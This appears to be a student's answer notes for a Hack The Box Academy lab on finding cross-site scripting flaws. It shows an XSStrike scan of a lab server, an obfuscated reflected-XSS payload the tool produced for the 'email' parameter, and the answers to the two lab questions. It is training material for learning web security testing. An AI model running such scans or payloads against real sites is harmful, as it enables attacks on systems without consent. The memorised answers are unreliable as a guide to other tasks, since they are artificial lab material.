# Section 05: XSS Discovery

Module: 19. Cross-Site Scripting (XSS)

---

## Questions & Answers

### 1. Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?

Context:
```bash
┌─[eu-academy-2]─[10.10.15.173]─[htb-ac-2162140@htb-0oqiaesaqo-htb-cloud-com]─[~/XSStrike]
└──╼ [★]$ python xsstrike.py -u "http://154.57.164.64:32029/?fullname=abc&username=abc&password=test&email=tes@gmail.com" 

	XSStrike v3.1.5

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: fullname 
[-] No reflection found 
[!] Testing parameter: username 
[-] No reflection found 
[!] Testing parameter: password 
[-] No reflection found 
[!] Testing parameter: email 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <d3v%0aONMouseOvEr%09=%09[8].find(confirm)>v3dm0s 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N] 
```

**Answer:** `email`

---

### 2. What type of XSS was found on the above server? "name only"


**Answer:** `reflected`

---

[Back to Module Index](./README.md)
